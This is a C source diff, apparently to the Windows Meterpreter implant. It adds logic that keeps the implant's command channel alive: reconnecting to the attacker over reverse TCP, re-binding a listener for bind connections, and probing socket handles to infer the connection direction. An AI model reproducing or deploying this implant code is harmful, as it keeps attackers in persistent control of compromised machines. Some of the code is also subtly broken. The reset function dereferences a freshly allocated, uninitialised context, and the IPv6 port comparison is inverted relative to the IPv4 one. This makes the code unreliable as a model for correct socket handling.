@@ -96,6 +96,7 @@ DWORD reverse_tcp4(const char* host, u_short port, short retryAttempts, SOCKET* 
 		// retry with a sleep if it fails, or exit the process on failure
 		if (retryAttempts-- <= 0)
 		{
+			closesocket(socketHandle);
 			return WSAGetLastError();
 		}
 
@@ -523,7 +524,7 @@ static BOOL server_negotiate_ssl(Remote *remote)
 			if ((ret = SSL_connect(ctx->ssl)) != 1)
 			{
 				res = SSL_get_error(ctx->ssl, ret);
-				dprintf("[SERVER] connect failed %d\n", res);
+				dprintf("[SERVER] connect failed %d", res);
 
 				if (res == SSL_ERROR_WANT_READ || res == SSL_ERROR_WANT_WRITE)
 				{
@@ -695,6 +696,16 @@ void transport_destroy_tcp(Remote* remote)
 	}
 }
 
+void transport_reset_tcp(Transport* transport)
+{
+	TcpTransportContext* ctx = (TcpTransportContext*)malloc(sizeof(TcpTransportContext));
+	if (ctx->fd)
+	{
+		closesocket(ctx->fd);
+	}
+	ctx->fd = 0;
+}
+
 Transport* transport_create_tcp(wchar_t* url)
 {
 	Transport* transport = (Transport*)malloc(sizeof(Transport));
@@ -711,6 +722,7 @@ Transport* transport_create_tcp(wchar_t* url)
 	transport->transport_init = configure_tcp_connection;
 	transport->transport_deinit = server_destroy_ssl;
 	transport->transport_destroy = transport_destroy_tcp;
+	transport->transport_reset = transport_reset_tcp;
 	transport->server_dispatch = server_dispatch;
 	transport->get_socket = tcp_transport_get_socket;
 	transport->ctx = ctx;
@@ -906,24 +918,43 @@ DWORD server_setup(SOCKET fd)
 
 			while (pRemote->nextTransport)
 			{
+				// Work off the next transport
 				pRemote->transport = pRemote->nextTransport;
-				pRemote->nextTransport = NULL;
 
 				dprintf("[SERVER] initialising transport 0x%p", pRemote->transport->transport_init);
 				if (pRemote->transport->transport_init && !pRemote->transport->transport_init(pRemote, fd))
 				{
+					// Hackety hack hack!
+					Sleep(5000);
 					break;
 				}
 
+				// once initialised, we'll clean up the next transport so that we don't try again
+				pRemote->nextTransport = NULL;
+
 				dprintf("[SERVER] Entering the main server dispatch loop for transport %x, context %x", pRemote->transport, pRemote->transport->ctx);
-				pRemote->transport->server_dispatch(pRemote, serverThread);
+				DWORD dispatchResult = pRemote->transport->server_dispatch(pRemote, serverThread);
 
 				if (pRemote->transport->transport_deinit)
 				{
 					pRemote->transport->transport_deinit(pRemote);
 				}
 
-				pRemote->transport->transport_destroy(pRemote);
+				// If the transport mechanism failed, then we should loop until we're able to connect back again.
+				// But if it was successful, and this is a valid exit, then we should clean up and leave.
+				if (dispatchResult == ERROR_SUCCESS)
+				{
+					pRemote->transport->transport_destroy(pRemote);
+				}
+				else
+				{
+					// try again!
+					if (pRemote->transport->transport_reset)
+					{
+						pRemote->transport->transport_reset(pRemote->transport);
+					}
+					pRemote->nextTransport = pRemote->transport;
+				}
 			}
 
 			dprintf("[SERVER] Deregistering dispatch routines...");
@@ -943,7 +974,7 @@ DWORD server_setup(SOCKET fd)
 	return res;
 }
 
-BOOL configure_tcp_connection(Remote* remote, SOCKET socket)
+BOOL configure_tcp_connection(Remote* remote, SOCKET sock)
 {
 	DWORD result = ERROR_SUCCESS;
 	size_t charsConverted;
@@ -986,10 +1017,191 @@ BOOL configure_tcp_connection(Remote* remote, SOCKET socket)
 			}
 		}
 	}
+	else if (ctx->sock_desc_size > 0)
+	{
+		int retryAttempts = 30;
+
+		dprintf("[STAGED] Attempted to reconnect based on inference from previous staged connection");
+
+		if (ctx->bound)
+		{
+			dprintf("[STAGED] previous connection was a bind connection");
+			SOCKET listenSocket = socket(ctx->sock_desc.ss_family, SOCK_STREAM, IPPROTO_TCP);
+
+			do
+			{
+				if (bind(listenSocket, (SOCKADDR *)&ctx->sock_desc, ctx->sock_desc_size) == SOCKET_ERROR)
+				{
+					result = WSAGetLastError();
+					dprintf("[STAGED] Failed to bind: %u %x", result, result);
+					break;
+				}
+
+				if (listen(listenSocket, 1) == SOCKET_ERROR)
+				{
+					dprintf("[STAGED] Failed to listen: %u %x", result, result);
+					result = WSAGetLastError();
+					break;
+				}
+
+				// Setup, ready to go, now wait for the connection.
+				ctx->fd = accept(listenSocket, NULL, NULL);
+
+				if (ctx->fd == INVALID_SOCKET)
+				{
+					result = GetLastError();
+					dprintf("[STAGED] Failed to listen: %u %x", result, result);
+					break;
+				}
+
+				result = ERROR_SUCCESS;
+			} while (0);
+
+			if (listenSocket != INVALID_SOCKET)
+			{
+				closesocket(listenSocket);
+			}
+		}
+		else
+		{
+			dprintf("[STAGED] previous connection was a reverse connection");
+			ctx->fd = socket(ctx->sock_desc.ss_family, SOCK_STREAM, IPPROTO_TCP);
+
+			result = ERROR_SUCCESS;
+
+			// try connect to the attacker at least once
+			while (connect(ctx->fd, (SOCKADDR*)&ctx->sock_desc, ctx->sock_desc_size) == SOCKET_ERROR)
+			{
+				// retry with a sleep if it fails, or exit the process on failure
+				if (retryAttempts-- <= 0)
+				{
+					closesocket(ctx->fd);
+					ctx->fd = 0;
+					result = GetLastError();
+					break;
+				}
+
+				Sleep(RETRY_TIMEOUT_MS);
+			}
+		}
+	}
 	else
 	{
+		SOCKET listenSocket;
+
 		// assume that we have been given a valid socket given that there's no stageless information
-		ctx->fd = socket;
+		ctx->fd = sock;
+
+		// default to reverse socket
+		ctx->bound = FALSE;
+
+		// for sockets that were handed over to us, we need to persist some information about it so that
+		// we can reconnect after failure. To support this, we need to first get the socket information
+		// which gives us addresses and port information
+		ctx->sock_desc_size = sizeof(ctx->sock_desc);
+		if (getsockname(ctx->fd, (struct sockaddr*)&ctx->sock_desc, &ctx->sock_desc_size) != SOCKET_ERROR)
+		{
+			if (ctx->sock_desc.ss_family == AF_INET)
+			{
+				dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in*)&ctx->sock_desc)->sin_port));
+			}
+			else
+			{
+				dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in6*)&ctx->sock_desc)->sin6_port));
+			}
+		}
+		else
+		{
+			dprintf("[STAGED] getsockname failed: %u (%x)", GetLastError(), GetLastError());
+		}
+
+		// then, to be horrible, we need to figure out the direction of the connection. To do this, we will
+		// Loop backwards from our current socket FD number
+		for (int i = 1; i <= 16; ++i)
+		{
+			// Windows socket handles are always multiples of 4 apart.
+			listenSocket = ctx->fd - i * 4;
+
+			vdprintf("[STAGED] Checking socket fd %u", listenSocket);
+
+			BOOL isListening = FALSE;
+			int isListeningLen = sizeof(isListening);
+			if (getsockopt(listenSocket, SOL_SOCKET, SO_ACCEPTCONN, (char*)&isListening, &isListeningLen) == SOCKET_ERROR)
+			{
+				dprintf("[STAGED] Couldn't get socket option to see if socket was listening: %u %x", GetLastError(), GetLastError());
+				continue;
+			}
+
+			if (!isListening)
+			{
+				dprintf("[STAGED] Socket appears to NOT be listening");
+				continue;
+			}
+
+			// try to get details of the socket address
+			struct sockaddr_storage listenStorage;
+			int listenStorageSize = sizeof(listenStorage);
+			if (getsockname(listenSocket, (struct sockaddr*)&listenStorage, &listenStorageSize) == SOCKET_ERROR)
+			{
+				vdprintf("[STAGED] Socket fd %u invalid: %u %x", listenSocket, GetLastError(), GetLastError());
+				continue;
+			}
+
+			// on finding a socket, see if it matches the family of our current socket
+			if (listenStorage.ss_family != ctx->sock_desc.ss_family)
+			{
+				vdprintf("[STAGED] Socket fd %u isn't the right family, it's %u", listenSocket, listenStorage.ss_family);
+				continue;
+			}
+
+			// if it's the same, and we are on the same local port, we can assume that there's a bind listener
+			if (listenStorage.ss_family == AF_INET)
+			{
+				if (((struct sockaddr_in*)&listenStorage)->sin_port == ((struct sockaddr_in*)&ctx->sock_desc)->sin_port)
+				{
+					vdprintf("[STAGED] Connection appears to be an IPv4 bind connection on port %u", ntohs(((struct sockaddr_in*)&listenStorage)->sin_port));
+					ctx->bound = TRUE;
+					break;
+				}
+				vdprintf("[STAGED] Socket fd %u isn't listening on the same port", listenSocket);
+			}
+			else if (listenStorage.ss_family == AF_INET6)
+			{
+				if (((struct sockaddr_in6*)&listenStorage)->sin6_port != ((struct sockaddr_in6*)&ctx->sock_desc)->sin6_port)
+				{
+					vdprintf("[STAGED] Connection appears to be an IPv6 bind connection on port %u", ntohs(((struct sockaddr_in6*)&listenStorage)->sin6_port));
+					ctx->bound = TRUE;
+					break;
+				}
+				vdprintf("[STAGED] Socket fd %u isn't listening on the same port", listenSocket);
+			}
+		}
+
+		if (ctx->bound)
+		{
+			// store the details of the listen socket so that we can use it again
+			ctx->sock_desc_size = sizeof(ctx->sock_desc);
+			getsockname(listenSocket, (struct sockaddr*)&ctx->sock_desc, &ctx->sock_desc_size);
+
+			// the listen socket that we have been given needs to be tidied up because
+			// the stager doesn't do it
+			closesocket(listenSocket);
+		}
+		else
+		{
+			// if we get here, we assume reverse_tcp, and so we need the peername data to connect back to
+			vdprintf("[STAGED] Connection appears to be a reverse connection");
+			ctx->sock_desc_size = sizeof(ctx->sock_desc);
+			getpeername(ctx->fd, (struct sockaddr*)&ctx->sock_desc, &ctx->sock_desc_size);
+			if (ctx->sock_desc.ss_family == AF_INET)
+			{
+				dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in*)&ctx->sock_desc)->sin_port));
+			}
+			else
+			{
+				dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in6*)&ctx->sock_desc)->sin6_port));
+			}
+		}
 	}
 
 	if (result != ERROR_SUCCESS)
